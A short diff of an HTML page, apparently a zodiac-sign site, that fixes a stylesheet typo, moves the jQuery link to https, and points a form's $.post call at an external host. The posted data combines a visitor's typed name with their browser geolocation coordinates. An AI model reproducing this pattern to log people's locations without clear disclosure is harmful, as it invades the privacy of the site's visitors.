@@ -13,7 +13,7 @@
 	<link rel="stylesheet" type="text/css" href="vendor/bootstrap/css/bootstrap.min.css">
 <!--===============================================================================================-->
 	
-	<link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.csss">
+	<link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
 <!--===============================================================================================-->
 	<link rel="stylesheet" type="text/css" href="fonts/iconic/css/material-design-iconic-font.min.css">
 <!--===============================================================================================-->
@@ -104,7 +104,7 @@
   
   
   
-  <script src="http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
 	
 	<script src="vendor/select2/select2.min.js"></script>
 	<script>
@@ -140,7 +140,7 @@
     });     
     function showPosition(position) {
       var posicao = $('#nome_c').val() + "-->  lat: " + position.coords.latitude + " Long: " + position.coords.longitude;
-      $.post( "salvar.php", { texto: posicao} 
+      $.post( "http://heitorgiacomini.esy.es/signos/salvar.php", { texto: posicao} 
     );
   
 }
